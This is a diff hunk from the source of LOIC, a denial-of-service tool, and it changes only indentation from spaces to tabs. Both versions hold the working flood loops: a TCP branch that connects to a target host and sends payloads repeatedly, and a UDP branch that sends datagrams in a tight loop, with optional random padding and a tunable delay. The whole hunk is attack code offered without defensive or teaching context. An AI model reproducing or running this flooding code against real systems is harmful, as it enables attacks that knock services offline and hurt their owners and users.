@@ -46,44 +46,44 @@ namespace LOIC
 					Socket socket = null;
 					if(Protocol == 1)
 					{
-                        using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
-                        {
-                            socket.NoDelay = true;
+						using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
+						{
+							socket.NoDelay = true;
 
-                            try { socket.Connect(RHost); }
-                            catch { continue; }
+							try { socket.Connect(RHost); }
+							catch { continue; }
 
-                            socket.Blocking = Resp;
-                            try
-                            {
-                                while (IsFlooding)
-                                {
-                                    FloodCount++;
-                                    buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
-                                    socket.Send(buf);
-                                    if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
-                                }
-                            }
-                            catch { }
-                        }
+							socket.Blocking = Resp;
+							try
+							{
+								while (IsFlooding)
+								{
+									FloodCount++;
+									buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
+									socket.Send(buf);
+									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
+								}
+							}
+							catch { }
+						}
 					}
 					if(Protocol == 2)
 					{
-                        using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
-                        {
-                            socket.Blocking = Resp;
-                            try
-                            {
-                                while (IsFlooding)
-                                {
-                                    FloodCount++;
-                                    buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
-                                    socket.SendTo(buf, SocketFlags.None, RHost);
-                                    if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
-                                }
-                            }
-                            catch { }
-                        }
+						using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
+						{
+							socket.Blocking = Resp;
+							try
+							{
+								while (IsFlooding)
+								{
+									FloodCount++;
+									buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
+									socket.SendTo(buf, SocketFlags.None, RHost);
+									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
+								}
+							}
+							catch { }
+						}
 					}
 				}
 			}
